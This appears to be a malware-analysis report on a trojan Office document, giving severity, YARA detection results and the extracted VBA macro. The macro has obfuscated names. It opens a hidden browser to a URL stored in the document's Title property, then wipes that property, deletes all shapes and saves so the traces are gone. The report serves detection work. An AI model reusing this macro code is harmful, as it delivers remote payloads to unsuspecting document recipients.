threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_yara_results.description: Detects an Microsoft Office file that contains the AutoOpen Macro function
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

macros.vba_code:
Function tVBqgD(XOrVhRPE As Single)
Dim PMAgSOt As Single
PMAgSOt = Timer + XOrVhRPE
While Timer < PMAgSOt
DoEvents
Wend
End Function
Function YBOkEmG() As String
YBOkEmG = ActiveDocument.BuiltInDocumentProperties("Title").Value
End Function
Function YYCFF()
Dim BMHoKFUgD As Object
Set BMHoKFUgD = CreateObject("InternetExplorer.Application")
BMHoKFUgD.Navigate YBOkEmG()
BMHoKFUgD.Toolbar = False
BMHoKFUgD.StatusBar = False
BMHoKFUgD.MenuBar = False
Do While BMHoKFUgD.Busy: DoEvents: Loop
tVBqgD ActiveDocument.BuiltInDocumentProperties("Keywords").Value
BMHoKFUgD.Quit
End Function
Function dFODC()
Do While ActiveDocument.Shapes.Count > 0
ActiveDocument.Shapes(1).Delete
Loop
End Function
Function iyesoj()
ActiveDocument.BuiltInDocumentProperties("Title").Value = ""
ActiveDocument.BuiltInDocumentProperties("Keywords").Value = "0"
ActiveDocument.Save
End Function
Function bnaSnK()
ActiveDocument.Save
ActiveDocument.Saved = True
End Function
Function hqXtnW()
YYCFF
iyesoj
dFODC
bnaSnK
End F
